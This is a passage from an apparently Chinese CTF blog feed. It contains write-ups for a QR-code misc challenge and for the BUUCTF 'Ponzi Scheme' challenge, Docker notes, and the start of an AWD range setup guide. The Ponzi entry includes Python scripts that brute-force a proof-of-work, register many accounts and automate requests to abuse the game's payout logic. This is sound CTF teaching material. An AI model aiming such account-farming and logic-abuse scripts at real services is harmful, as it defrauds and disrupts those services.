title="MISC-2-QrJoker"></a>MISC-2-QrJoker</h3><p>这道题预期解应该是写脚本的，知道这道题需要获取数据区的内容，但是不会写脚本只能手撸了</p><p>在线解码网站：<a href="https://merricx.github.io/qrazybox/?tdsourcetag=s_pctim_aiomsg">https://merricx.github.io/qrazybox/?tdsourcetag=s_pctim_aiomsg</a></p><p>这里我说一下怎么操作就好了，毕竟是手撸出来的，操作步骤都一样，重复64次</p><h4 id="分帧"><a href="#分帧" class="headerlink" title="分帧"></a>分帧</h4><p>首先，题目给了一个gif图片，每一帧都有一个不完整的二维码</p><p><img src="/images/DASCTF-7/QrJoker.gif"></p><p>这里我用的Stegsolve.jar工具，保存每一帧即可，当然也可以其他工具或者脚本(我脚本能力差也懒)</p><p>我是使用下方的方式保存了64帧的图片</p><p><img src="/images/DASCTF-7/MISC2-1.png"></p><h4 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h4><p>1.首先需要知道这个二维码的纠错等级和掩码和尺寸，可以根据右上角的回字下方判断</p><p>2.发现64张图片的掩码和纠错都是一样的，这样就方便了很多</p><p>3.在工具中选择合适的掩码和纠错</p><p>单词下方蓝色区域即可选择</p><p><img src="/images/DASCTF-7/MISC2-2.png"></p><p><img src="/images/DASCTF-7/MISC2-3.png"></p><p>选好后点击save 保存</p><p>4.先将背景色涂为白色</p><p><img src="/images/DASCTF-7/MISC2-4.png"></p><p>5.开始了，重复64次 按照每个二维码的信息填上去</p><p><img src="/images/DASCTF-7/MISC2-5.png"></p><p><img src="/images/DASCTF-7/MISC2-6.png"></p><p><img src="/images/DASCTF-7/MISC2-7.png"></p><p>在底部即可查看到扫码出来的信息，注意都是6个字符，%xx的格式，如果不是说明二维码信息填错了</p><p>下方是我得到的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">%56%6A 1</span><br><span class="line">%49%77 2</span><br><span class="line">%65%45 3</span><br><span class="line">%35%48 4</span><br><span class="line">%52%6B 5</span><br><span class="line">%64%69 6</span><br><span class="line">%4D%33 7</span><br><span class="line">%42%72 8</span><br><span class="line">%55%6A 9</span><br><span class="line">%4E%53 10</span><br><span class="line">%55%46 11   </span><br><span class="line">%6C%58 12 </span><br><span class="line">%4D%54 13</span><br><span class="line">%52%6A 14</span><br><span class="line">%4D%57 15</span><br><span class="line">%52%79 16</span><br><span class="line">%57%6B 17</span><br><span class="line">%5A%61 18</span><br><span class="line">%54%31 19</span><br><span class="line">%5A%55 20</span><br><span class="line">%52%6C 21  </span><br><span class="line">%5A%5A 22</span><br><span class="line">%56%57 23</span><br><span class="line">%51%30 24</span><br><span class="line">%56%32 25</span><br><span class="line">%31%57 26</span><br><span class="line">%63%6B 27  </span><br><span class="line">%31%45 28</span><br><span class="line">%52%6C 29</span><br><span class="line">%56%4E 30</span><br><span class="line">%56%6B 31</span><br><span class="line">%70%78 32</span><br><span class="line">%56%47 33</span><br><span class="line">%78%56 34</span><br><span class="line">%4E%56 35</span><br><span class="line">%4A%58 36</span><br><span class="line">%53%6B 37</span><br><span class="line">%68%68 38</span><br><span class="line">%52%54 39</span><br><span class="line">%6C%58 40</span><br><span class="line">%54%56 41</span><br><span class="line">%5A%56 42</span><br><span class="line">%64%31 43</span><br><span class="line">%59%79 44</span><br><span class="line">%4D%58 45</span><br><span class="line">%64%69 46</span><br><span class="line">%4D%6B 47</span><br><span class="line">%5A%79 48</span><br><span class="line">%54%6C 49</span><br><span class="line">%52%61 50</span><br><span class="line">%55%6C 51</span><br><span class="line">%64%49 52</span><br><span class="line">%51%6D 53</span><br><span class="line">%46%57 54</span><br><span class="line">%61%32 55</span><br><span class="line">%52%50 56</span><br><span class="line">%54%6C 57  </span><br><span class="line">%5A%52 58</span><br><span class="line">%65%46 59  </span><br><span class="line">%6F%7A 60</span><br><span class="line">%5A%44 61</span><br><span class="line">%46%56 62</span><br><span class="line">%56%44 63</span><br><span class="line">%41%35 64</span><br></pre></td></tr></table></figure><p>进行url解码去除空格  换行之后的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VjIweE5HRkdiM3BrUjNSUFlXMTRjMWRyWkZaT1ZURlZZVWQ0V21Wck1ERlVNVkpxVGxVNVJXSkhhRTlXTVZVd1YyMXdiMkZyTlRaUldIQmFWa2RPTlZReFozZDFVVDA5</span><br></pre></td></tr></table></figure><p>进行三个base64解码就拿到flag了</p><p>手撸了一个多小时终于把这道题解出来了，期间还有几个码扫码错了，导致需要查错耽误了比较多的时间不过有惊无险抢到了一血</p><p><img src="/images/DASCTF-7/tail.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;WEB-1-include&quot;&gt;&lt;a href=&quot;#WEB-1-include&quot; class=&quot;headerlink&quot; title=&quot;WEB-1-include&quot;&gt;&lt;/a&gt;WEB-1-include&lt;/h3&gt;&lt;p&gt;题目链接：&lt;a href=&quot;http://183.1</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/tags/CTF/"/>
    
    <category term="MISC" scheme="http://blog.falsectf.top/tags/MISC/"/>
    
    <category term="安恒杯" scheme="http://blog.falsectf.top/tags/%E5%AE%89%E6%81%92%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>MISC-Ponzi Scheme</title>
    <link href="http://blog.falsectf.top/2020/07/01/27b520c7.html"/>
    <id>http://blog.falsectf.top/2020/07/01/27b520c7.html</id>
    <published>2020-07-01T14:13:21.000Z</published>
    <updated>2020-12-31T12:48:49.595Z</updated>
    
    <content type="html"><![CDATA[<p>题目链接：BUUCTF ——&gt;MISC ——&gt; [AIS3 EOF CTF 2019 Quals]Ponzi Scheme</p><h3 id="1-爆破"><a href="#1-爆破" class="headerlink" title="1.爆破"></a>1.爆破</h3><p>题目是一个web页面，打开如下图所示，需要爆破出满足条件的sha256的值</p><p><img src="/images/BUU/Ponzi-Scheme/01.png"></p><p>根据原exp截取的爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/bin/bash/python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">prefix, difficulty=<span class="number">22</span></span>):</span></span><br><span class="line">    zeros = <span class="string">&#x27;0&#x27;</span> * difficulty</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_valid</span>(<span class="params">digest</span>):</span></span><br><span class="line">        bits = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> digest)</span><br><span class="line">        <span class="keyword">return</span> bits[:difficulty] == zeros</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        s = prefix + <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">if</span> is_valid(hashlib.sha256(s.encode()).digest()):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i)</span><br><span class="line"><span class="built_in">print</span>(solve(<span class="string">&#x27;bxpDU9eDYFuS9M0vH_VQvQ &#x27;</span>)) <span class="comment">#输入网页中给定的数据，60s变一次</span></span><br></pre></td></tr></table></figure><h3 id="2-投资"><a href="#2-投资" class="headerlink" title="2.投资"></a>2.投资</h3><p>爆破成功后是需要输入的是数字，然后会跳转到投资的链接</p><p><img src="/images/BUU/Ponzi-Scheme/02.png"></p><p>可以看到，需要10000元才可以获取到flag，抓包改数据是没有用的，只能通过三种投资方式赚取</p><p>下方有一个问答，这里提示了</p><p>1.投资会将所有金额全部投资进去</p><p>2.如果Ponzi没有资金支付，将宣布破产，而您将一无所获</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">问：这些计划是什么意思？</span><br><span class="line">答：例如，如果您在计划（C）中投资了$ 1,000，则在1800秒后可以收回$ 10,000。</span><br><span class="line">问：是否需要投资我所有的钱？</span><br><span class="line">答：是的，全部或全部！</span><br><span class="line">问：如果庞兹（Ponzi）没有足够的钱付给我怎么办？</span><br><span class="line">答：Panzi将宣布破产，而您一无所获。</span><br><span class="line">问：我以后如何返回此页面？</span><br><span class="line">答：只需将此页面添加到“我的收藏夹”即可。</span><br></pre></td></tr></table></figure><p>经过测试分析，当一个用户进行投资时，Ponzi的当前金额小于回报时，就会破产，你的资金都会给到Ponzi，当然，正在投资的资金也会记录在Ponzi的当前金额中。</p><p><img src="/images/BUU/Ponzi-Scheme/03.png"></p><p>分析后发现，可以多爆破出几个账户，这样都进行C级的投资，需要等待1800s，在这1800s中，每个人的1000资金都是属于Ponzi的，将Ponzi的当前余额刷到高于10000 (最好大于11000)比较稳定，防止出现意外。</p><h3 id="3-利用脚本自动投资"><a href="#3-利用脚本自动投资" class="headerlink" title="3.利用脚本自动投资"></a>3.利用脚本自动投资</h3><h4 id="批量爆破获取账户"><a href="#批量爆破获取账户" class="headerlink" title="批量爆破获取账户"></a>批量爆破获取账户</h4><p>这里爆破需要等待一段时间，因为账户比较多</p><p>这里会自动进行获取网页内给定的数据进行爆破，爆破结果脚本已经自动输入了，并且返回了输入后跳转到的链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/bin/bash/python3</span></span><br><span class="line"><span class="keyword">import</span> requests, re, hashlib, multiprocessing, time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">prefix, difficulty=<span class="number">22</span></span>):</span></span><br><span class="line">    zeros = <span class="string">&#x27;0&#x27;</span> * difficulty</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_valid</span>(<span class="params">digest</span>):</span></span><br><span class="line">        bits = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> digest)</span><br><span class="line">        <span class="keyword">return</span> bits[:difficulty] == zeros</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        s = prefix + <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">if</span> is_valid(hashlib.sha256(s.encode()).digest()):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i)</span><br><span class="line">urls = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip().splitlines()</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">urli=<span class="string">&quot;http://cc4853ae-f8ed-454c-8d33-e946ec0d41ce.node3.buuoj.cn/&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(urls) &lt; <span class="number">11</span>:</span><br><span class="line">    r = s.get(urli).text</span><br><span class="line">    prefix = re.findall(<span class="string">&#x27;&lt;code&gt;(.*)&lt;/code&gt;&#x27;</span>, r)[<span class="number">0</span>]</span><br><span class="line">    u = s.get(urli, params=<span class="built_in">dict</span>(answer=solve(prefix)), allow_redirects=<span class="literal">True</span>).url</span><br><span class="line">    <span class="built_in">print</span>(u)</span><br><span class="line">    urls.append(u)</span><br><span class="line"><span class="built_in">print</span>(urls)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>跑出来一个账户后进去点一下C级的投资，注意  此时已经有12000资金了，下一个账户可以进行投资getflag了，所以下一个用户<strong>不要</strong>进行C级投资了</p><p><img src="/images/BUU/Ponzi-Scheme/04.png"></p><h4 id="自动投资"><a href="#自动投资" class="headerlink" title="自动投资"></a>自动投资</h4><p>A级投资大概13分钟</p><p>B级投资大概16分钟</p><p>C级30分钟</p><p>下方是自动投资脚本，资金大于10000后会输出flag内容</p><p>修改plan值对应ABC级投资，修改sleep()对应ABC级的时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/bin/bash/python3</span></span><br><span class="line"><span class="comment">#13分钟左右</span></span><br><span class="line"><span class="keyword">import</span> requests,re,time</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance</span>(<span class="params">url,plan=<span class="number">0</span></span>):</span><span class="comment">#0是第一个，1是中间，2是30分钟</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.get(url).text</span><br><span class="line">    csrf = re.findall(<span class="string">&#x27;name=&quot;csrf&quot; value=&quot;(.*)&quot;&#x27;</span>, r)[<span class="number">0</span>]</span><br><span class="line">    res = s.post(url, data=<span class="built_in">dict</span>(plan=plan, csrf=csrf)).text</span><br><span class="line">    <span class="comment">#print(&#x27;url=&#x27;, url, &#x27;csrf=&#x27;, csrf, &#x27;r=&#x27;, res[:16])</span></span><br><span class="line">    time.sleep(<span class="number">6</span>)<span class="comment">#如果是B级投资改成90，C级1800</span></span><br><span class="line">    b = re.findall(<span class="string">&#x27;Your account balance: &lt;b&gt;\\$ ([0-9]*)&lt;/b&gt;&#x27;</span>, s.get(url).text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://cc4853ae-f8ed-454c-8d33-e946ec0d41ce.node3.buuoj.cn/qgxKMqfgM4sqbVnXVMtd9g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    money = get_balance(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;money =&quot;</span>,money)</span><br><span class="line">    <span class="keyword">if</span> money&gt;<span class="number">10000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,re.findall(<span class="string">&#x27;flag&#123;(.*.)&#125;&#x27;</span>, s.get(url).text))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>脚本运行结果：flag: [‘ec53ff77-f14f-4f37-9459-443996518c33’]</p><p><img src="/images/BUU/Ponzi-Scheme/05.png"></p><p>题目是动态flag，方法是这样的，直接提交flag是没用的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目链接：BUUCTF ——&amp;gt;MISC ——&amp;gt; [AIS3 EOF CTF 2019 Quals]Ponzi Scheme&lt;/p&gt;
&lt;h3 id=&quot;1-爆破&quot;&gt;&lt;a href=&quot;#1-爆破&quot; class=&quot;headerlink&quot; title=&quot;1.爆破&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.falsectf.top/tags/CTF/"/>
    
    <category term="MISC" scheme="http://blog.falsectf.top/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="http://blog.falsectf.top/2020/06/02/4a3d459a.html"/>
    <id>http://blog.falsectf.top/2020/06/02/4a3d459a.html</id>
    <published>2020-06-02T10:02:26.000Z</published>
    <updated>2020-12-31T11:50:18.079Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新…</p><h3 id="docker基础命令"><a href="#docker基础命令" class="headerlink" title="docker基础命令"></a>docker基础命令</h3><h4 id="镜像管理"><a href="#镜像管理" class="headerlink" title="镜像管理"></a>镜像管理</h4><h5 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.搜索</span><br><span class="line">docker search &lt;keyword&gt;</span><br><span class="line">2.拉取</span><br><span class="line">docker pull &lt;image&gt;</span><br></pre></td></tr></table></figure><h5 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker images -a</span><br></pre></td></tr></table></figure><h5 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.先查看</span><br><span class="line">docker ps</span><br><span class="line">2.删除</span><br><span class="line">docker rmi &lt;image&gt;</span><br></pre></td></tr></table></figure><h5 id="导出镜像"><a href="#导出镜像" class="headerlink" title="导出镜像"></a>导出镜像</h5><p>save命令会将镜像完整保存，包括历史版本和元数据信息，所以文件可能比较大。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o test.tar &lt;image&gt;   image是镜像名，保存为test.tar</span><br></pre></td></tr></table></figure><h5 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i /路径/test.tar</span><br></pre></td></tr></table></figure><h4 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h4><h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker run</span><br><span class="line">常用参数：</span><br><span class="line">-d : 后台运行，不会进入容器内部</span><br><span class="line">-i : 交互式操作</span><br><span class="line">-t : terminal 终端</span><br><span class="line">-p : 端口映射 &lt;外部端口:内部端口&gt;</span><br><span class="line">--name : 为容器指定一个名字</span><br><span class="line">常用两种类型：</span><br><span class="line">    1.后台运行，不进入容器内部</span><br><span class="line">    docker run -d -p 8801:80 &lt;image&gt;</span><br><span class="line">    2.进入容器内部</span><br><span class="line">    docker run -it -p 8801:80 &lt;image&gt;</span><br><span class="line">容器启动后每个容器会有唯一的一个sha标识</span><br></pre></td></tr></table></figure><h5 id="查看容器运行状态信息"><a href="#查看容器运行状态信息" class="headerlink" title="查看容器运行状态信息"></a>查看容器运行状态信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps    查看正在运行的容器</span><br><span class="line">docker ps -a 查看所有容器状态，包括停止的容器</span><br></pre></td></tr></table></figure><h5 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h5><p>docker exec –help</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it &lt;CONTAINER ID&gt;或指定的--name /bin/bash</span><br></pre></td></tr></table></figure><h5 id="运行、停止、删除"><a href="#运行、停止、删除" class="headerlink" title="运行、停止、删除"></a>运行、停止、删除</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start &lt;CONTAINER ID&gt;  运行</span><br><span class="line">docker stop &lt;CONTAINER ID&gt;   停止</span><br><span class="line">docker rm -f &lt;CONTAINER ID&gt;  删除</span><br><span class="line">如果启动容器时，设置了--name 将ID部分替换为name也是可以的</span><br></pre></td></tr></table></figure><p>这里给一个停止、<strong>删除所有容器</strong>的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker stop </span><br><span class="line">docker ps -a | awk &#x27;&#123;print $1&#125;&#x27; | xargs docker rm</span><br></pre></td></tr></table></figure><h5 id="导出容器"><a href="#导出容器" class="headerlink" title="导出容器"></a>导出容器</h5><p>docker export</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export &lt;CONTAINER ID&gt; &gt;xx-backup.tar</span><br></pre></td></tr></table></figure><h5 id="导入容器"><a href="#导入容器" class="headerlink" title="导入容器"></a>导入容器</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat docker/xx-backup.tar | docker import - test:v1</span><br></pre></td></tr></table></figure><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><p>常用的几个命令</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>FROM</td><td>FROM是必须的，指定一个基础镜像</td></tr><tr><td>WORKDIR</td><td>指定默认的工作目录,如果目录不存在会自动创建</td></tr><tr><td>COPY</td><td>将宿主机文件或文件夹copy进docker中,无法加载网络资源</td></tr><tr><td>ADD</td><td>与COPY类似，本地的tar文件会自动在容器内解压,ADD可加载网络资源</td></tr><tr><td>RUN</td><td>在docker镜像<strong>构建的时候</strong>执行的shell命令</td></tr><tr><td>CMD</td><td>在docker镜像每次<strong>启动运行</strong>时执行的命令</td></tr><tr><td>ENTRYPOINT</td><td>与CMD类似，使用时是数组格式[“命令”,”参数”,”文件”],当Dockerfile种存在多个ENTRYPOINT与CMD时，只有最后一个会生效</td></tr><tr><td>ENV</td><td>添加系统的环境变量</td></tr><tr><td>EXPOSE</td><td>指定暴露的端口，web镜像时常用80</td></tr></tbody></table><p>在使用Dockerfile构建镜像时，FROM命令是必须的，为镜像指定一个基础镜像</p><p>首先，创建一个任意名字的目录，进入里面 <code>mkdir Dockerfile</code></p><p>注意：使用Dockerfile构建镜像时，文件的名字必须是Dockerfile   首字母D大写，然后在此文件内输入操作的命令。</p><p>举例如下：Dockerfile内容</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">14.04</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./run.sh /run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;date&#x27;</span> &gt; /run.sh</span></span><br><span class="line"><span class="keyword">ENV</span> flag=flag&#123;<span class="number">123</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;echo <span class="variable">$flag</span>&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>在Dockerfile所在目录，使用如果下命令进行构建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t test:v1 .</span><br></pre></td></tr></table></figure><p>-t 为构建的镜像指定一个名字，:v1是版本号,可有可无,用于区分   最后面的空格 <strong>.</strong> 是必须的</p><p>有空继续写….</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;持续更新…&lt;/p&gt;
&lt;h3 id=&quot;docker基础命令&quot;&gt;&lt;a href=&quot;#docker基础命令&quot; class=&quot;headerlink&quot; title=&quot;docker基础命令&quot;&gt;&lt;/a&gt;docker基础命令&lt;/h3&gt;&lt;h4 id=&quot;镜像管理&quot;&gt;&lt;a href=&quot;#镜像管理</summary>
      
    
    
    
    <category term="Docker" scheme="http://blog.falsectf.top/categories/Docker/"/>
    
    
    <category term="Docker" scheme="http://blog.falsectf.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>AWD攻防靶场搭建</title>
    <link href="http://blog.falsectf.top/2020/05/09/5a641b8b.html"/>
    <id>http://blog.falsectf.top/2020/05/09/5a641b8b.html</id>
    <published>2020-05-09T02:14:30.000Z</published>
    <updated>2020-12-31T11:50:15.510Z</updated>
    
    <content type="html"><![CDATA[<h3 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h3><p>emmmm  我对于这个也不是很了解  大家网上搜索一下吧，有很多教程<br>我搭建时候使用的是云机Ubuntu 18.4系统</p><p>然后就是为什么我用了云机呢，因为他几乎不存在镜像拉取失败的问题，比较的方便</p><h3 id="github下载开源项目"><a href="#github下载开源项目" class="headerlink" title="github下载开源项目"></a>github下载开源项目</h3><p>命令：<code>git clone https://github.com/zhl2008/awd-platform.git</code><br>这里文件还是蛮大的，需要等待一段时间<br>下载好后 <code>cd awd-platform-master</code>进入文件夹中</p><h3 id="拉取docker镜像"><a href="#拉取docker镜像" class="headerlink" title="拉取docker镜像"></a>拉取docker镜像</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>如果不是使用云机搭建或docker没有加速建议使用方法二<br>命令：<code>docker pull zhl2008/web_14.04</code><br>然后这里需要等待较长的一段时间，镜像有1G大小</p><p>拉取完镜像后修改一下镜像名字： <code>docker tag zhl2008/web_14.04 web_14.04</code></p><p>然后如果说已经做到了这里，没有报错，那么就可以运行了<br>启动环境：root权限运行，在awd-platform-master目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1、</span><br><span class="line">创建队伍数量及靶机 